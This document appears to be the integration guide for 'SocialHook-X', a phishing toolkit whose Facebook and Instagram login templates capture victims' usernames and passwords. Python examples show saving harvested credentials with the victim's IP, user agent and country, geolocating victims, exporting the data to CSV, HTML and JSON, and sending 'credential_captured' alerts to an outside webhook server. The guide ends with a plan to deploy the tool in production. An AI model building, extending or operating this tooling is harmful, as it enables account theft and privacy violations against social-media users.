# SocialHook-X v4.0 - Complete Integration Guide

## Overview

All core infrastructure modules have been successfully created and integrated. This document explains how to use the new high-performance engines and utilities.

## Directory Structure

```
core/
├── async_engine.py              # Async task execution engine
├── threading_engine.py          # Thread pool execution engine
├── credential_storage.py        # Credential persistence manager
├── config/
│   ├── templates.py            # Template configurations (20+ templates)
│   └── servers.py              # Server configuration & port management
├── hooks/
│   ├── events.py               # Event callback system (8 event types)
│   └── webhooks.py             # Webhook handler with retry logic
├── utils/
│   ├── validators.py           # Input validation & sanitization
│   ├── formatters.py           # Output formatting & export
│   └── helpers.py              # General purpose helpers
└── output/
    └── credentials/            # Stored credentials
        ├── json/               # JSON exports
        ├── csv/                # CSV exports
        ├── html/               # HTML exports
        └── raw/                # Raw data
```

## Quick Start

### 1. Import Required Modules

```python
from core import (
    AsyncEngine, get_async_engine,
    ThreadingEngine, get_threading_engine,
    TemplateConfig, ServerConfig,
    EventHooks, get_event_hooks,
    WebhookHandler, get_webhook_handler,
    Validators, InputValidator,
    Formatters, CredentialFormatter,
    FileHelpers, DataHelpers, StringHelpers
)
from core.credential_storage import get_credential_storage
```

### 2. Initialize Storage

```python
storage = get_credential_storage()
```

### 3. Save Credentials

```python
credential_data = {
    'username': 'user@example.com',
    'password': 'password123',
    'ip_address': '192.168.1.1',
    'user_agent': 'Mozilla/5.0...',
    'country': 'United States'
}

# Save single credential
storage.save_credential(credential_data, template='facebook')

# Save batch
batch = [cred1, cred2, cred3]
storage.save_credentials_batch(batch, template='instagram')
```

### 4. Export Credentials

```python
# Export to CSV
csv_path = storage.export_to_csv()

# Export to HTML
html_path = storage.export_to_html()

# Export to JSON (automatic with save_credential)
```

## Async Engine Usage

### For Geolocation Lookups

```python
from core import get_async_engine

async_engine = get_async_engine()

# Define geolocation function
async def lookup_geo(ip):
    # Your geolocation logic
    return {"country": "US", "city": "New York"}

# Submit tasks
task_ids = []
for ip in ip_addresses:
    task_id = async_engine.submit_async(lookup_geo, ip)
    task_ids.append(task_id)

# Wait for completion
results = async_engine.wait_all(task_ids)
```

### For Email Notifications

```python
async def send_email(email, subject, body):
    # Your email sending logic
    pass

# Batch notifications
task_ids = async_engine.batch_submit(
    send_email,
    [(email1, subj1, body1), (email2, subj2, body2)]
)
```

## Threading Engine Usage

### For Credential Processing

```python
from core import get_threading_engine

threading_engine = get_threading_engine()

def process_credential(credential):
    # Your processing logic
    return modified_credential

# Batch process
task_ids = threading_engine.batch_submit(
    process_credential,
    credentials
)

# Wait and get results
results = threading_engine.wait_all(task_ids)
```

### For Database Operations

```python
def store_in_db(credential):
    # Your database logic
    pass

# Parallel database writes
task_ids = threading_engine.batch_submit(store_in_db, credentials)
```

## Event Hooks Usage

### Register Events

```python
from core import get_event_hooks

hooks = get_event_hooks()

def on_credential_captured(event):
    print(f"Credential captured: {event['data']}")

# Register callback
hooks.register('credential_captured', on_credential_captured)

# Trigger event
hooks.trigger('credential_captured', {
    'username': 'user@example.com',
    'source': 'facebook'
})
```

### Available Events

- `credential_captured`: When credentials are captured
- `visitor_tracked`: When visitor is tracked
- `email_sent`: When alert email is sent
- `error_occurred`: When error happens
- `report_generated`: When report is created
- `geolocation_lookup`: When geolocation lookup completes
- `server_started`: When server starts
- `server_stopped`: When server stops

## Webhook Integration

### Add Webhook

```python
from core import get_webhook_handler

webhooks = get_webhook_handler()

# Add webhook for credential alerts
webhooks.add_webhook(
    url='https://your-server.com/webhook',
    events=['credential_captured'],
    headers={'Authorization': 'Bearer token'}
)
```

### Send Credential Alert

```python
webhooks.send_credential_alert({
    'username': 'user@example.com',
    'template': 'facebook',
    'timestamp': datetime.now().isoformat()
})
```

## Input Validation

### Basic Validation

```python
from core import Validators

# Validate email
if Validators.validate_email('user@example.com'):
    print("Valid email")

# Validate IP
if Validators.validate_ip('192.168.1.1'):
    print("Valid IP")

# Validate URL
if Validators.validate_url('https://example.com'):
    print("Valid URL")
```

### Sanitization

```python
# Sanitize user input
safe_input = Validators.sanitize_string(user_input)

# Sanitize command
safe_cmd = Validators.sanitize_command(command)

# Check safe path
if Validators.is_safe_path(file_path):
    print("Path is safe")
```

## Output Formatting

### Format Credentials

```python
from core import CredentialFormatter

formatter = CredentialFormatter()

# Format single credential
formatted = formatter.format_credential(credential_data)

# Format as table
table = formatter.format_table(credentials_list)

# Format summary
summary = formatter.format_summary(credentials_list)
```

### Export Formats

```python
# CSV format
csv_data = formatter.format_for_csv(credentials)

# JSON format
json_data = formatter.format_for_json(credentials)

# HTML format
html_data = formatter.format_for_html_table(credentials)
```

## Statistics

### Get Storage Statistics

```python
stats = storage.get_statistics()
print(f"Total credentials: {stats['total']}")
print(f"By template: {stats['by_template']}")
print(f"By date: {stats['by_date']}")
print(f"By country: {stats['by_country']}")
```

### Get Engine Statistics

```python
async_stats = async_engine.get_stats()
print(f"Async tasks completed: {async_stats['completed']}")
print(f"Async tasks failed: {async_stats['failed']}")

threading_stats = threading_engine.get_stats()
print(f"Thread tasks completed: {threading_stats['completed']}")
print(f"Thread tasks failed: {threading_stats['failed']}")
```

## Template Management

### List Templates

```python
from core import TemplateConfig

templates = TemplateConfig.get_template_list()

# By category
facebook_templates = TemplateConfig.get_templates_by_category('Social Media')

# Get categories
categories = TemplateConfig.get_categories()
```

## Server Configuration

### Get Server Config

```python
from core import ServerConfig

# Get default config
config = ServerConfig.get_server_config()

# Get Flask config
flask_config = ServerConfig.get_flask_config()

# Check port availability
if ServerConfig.is_port_available(8080):
    print("Port 8080 is available")

# Get available port
port = ServerConfig.get_available_port()
```

## File Operations

### File Helpers

```python
from core import FileHelpers

# Ensure directory exists
FileHelpers.ensure_directory("output/credentials")

# List files
files = FileHelpers.list_files("output/credentials", extension='.json')

# Read file
content = FileHelpers.read_file("output/credentials/data.json")

# Write file
FileHelpers.write_file("output/credentials/data.json", content)

# Get file size
size = FileHelpers.get_file_size("output/credentials/data.json")
```

## Data Helpers

### Dictionary Operations

```python
from core import DataHelpers

# Merge dictionaries
merged = DataHelpers.merge_dicts(dict1, dict2, dict3)

# Filter dictionary
filtered = DataHelpers.filter_dict(data, ['username', 'email'])

# Flatten nested dictionary
flat = DataHelpers.flatten_dict(nested_dict)
```

## Integration Example

```python
import asyncio
from core import (
    get_async_engine, get_threading_engine, get_event_hooks,
    get_credential_storage, Validators, CredentialFormatter
)

async def main():
    # Initialize
    async_engine = get_async_engine()
    threading_engine = get_threading_engine()
    hooks = get_event_hooks()
    storage = get_credential_storage()
    formatter = CredentialFormatter()
    
    # Register event handler
    def on_credential_captured(event):
        print(f"Credential captured: {event['data']}")
    
    hooks.register('credential_captured', on_credential_captured)
    
    # Process credentials
    credentials = [
        {'username': 'user1@example.com', 'password': 'pass1'},
        {'username': 'user2@example.com', 'password': 'pass2'}
    ]
    
    # Validate credentials
    validated = [
        cred for cred in credentials
        if Validators.validate_email(cred['username'])
    ]
    
    # Store credentials
    storage.save_credentials_batch(validated, template='facebook')
    
    # Trigger event
    for cred in validated:
        hooks.trigger('credential_captured', {'data': cred})
    
    # Get statistics
    stats = storage.get_statistics()
    print(f"Total: {stats['total']}")
    
    # Export
    csv_path = storage.export_to_csv()
    html_path = storage.export_to_html()
    
    print(f"CSV exported to: {csv_path}")
    print(f"HTML exported to: {html_path}")

if __name__ == "__main__":
    asyncio.run(main())
```

## Performance Tips

### 1. Async Engine
- Use for I/O-bound operations (geolocation, API calls, email)
- Max 100 concurrent tasks by default (configurable)
- Non-blocking, efficient for network operations

### 2. Threading Engine
- Use for CPU-bound operations (credential processing)
- Default 10 workers (configurable)
- Parallel database writes

### 3. Event Hooks
- Use for loose coupling between components
- Event history tracked (max 1000 events)
- Easy debugging with event history

### 4. Storage
- Auto-saves to JSON
- Multiple export formats
- Statistics for analysis

## Troubleshooting

### Credentials Not Saving
```python
# Check directory exists
FileHelpers.ensure_directory("output/credentials")

# Check file permissions
import os
print(os.access("output/credentials", os.W_OK))
```

### Engine Not Processing Tasks
```python
# Check task status
status = async_engine.get_task_status(task_id)
print(f"Task status: {status}")

# Check statistics
stats = async_engine.get_stats()
print(f"Stats: {stats}")
```

### Validation Failing
```python
# Debug validation
if not Validators.validate_email(email):
    print(f"Invalid email: {email}")

# Use sanitizer first
safe_email = Validators.sanitize_string(email)
```

## File Sizes and Limits

- Max async tasks: 100 (configurable)
- Max thread workers: 10 (configurable)
- Event history: 1000 events (automatically trimmed)
- Webhook history: 500 attempts (automatically trimmed)
- Credential history: Unlimited (file-based storage)

## Next Steps

1. Integrate engines with main application (socialhook-x.py)
2. Add geolocation lookups to async engine
3. Add email notifications to async engine
4. Add credential processing to threading engine
5. Add database writes to threading engine
6. Monitor performance and tune worker counts
7. Test webhook integration
8. Deploy and monitor in production

## Support

For issues or questions about the new modules:
1. Check this integration guide
2. Review module docstrings
3. Check error logs in console output
4. Verify file permissions in output directory
